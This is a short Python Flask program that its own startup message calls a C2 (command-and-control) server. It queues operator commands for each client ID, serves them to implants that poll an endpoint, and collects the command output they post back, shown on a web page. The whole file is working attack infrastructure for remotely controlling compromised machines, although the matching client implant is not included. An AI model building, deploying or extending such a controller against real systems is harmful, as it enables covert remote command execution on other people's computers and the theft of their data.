from flask import Flask, request, render_template, redirect, url_for, jsonify
import json
import threading
import sys

# Verifica si se pasó al menos un argumento
if len(sys.argv) > 1:
    lport = sys.argv[1]
    print(f"    [!] Launch C2 at: {lport}")
else:
    print("    [!] Need pass the port as argument")
    sys.exit(2)

app = Flask(__name__)
commands = {} 
results = {}  
connected_clients = set() 

@app.route('/')
def index():
    return render_template('index.html', connected_clients=connected_clients, results=results)

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id) 
    if client_id in commands:
        command = commands.pop(client_id)
        print(f"[INFO] Sending command to {client_id}: {command}")
        return command, 200 
    return '', 204

@app.route('/command/<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        data = request.json
        if data and 'output' in data:
            output = data['output']
            results[client_id] = output
            print(f"[INFO] Received output from {client_id}: {output}")
            return jsonify({"status": "success"}), 200
        else:
            print(f"[ERROR] Invalid data received from {client_id}")
            return jsonify({"status": "error", "message": "Invalid data format"}), 400
    except json.JSONDecodeError:
        print(f"[ERROR] Invalid JSON received from {client_id}")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        print(f"[ERROR] Unexpected error processing request from {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']
    commands[client_id] = command
    return redirect(url_for('index')) 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=lport)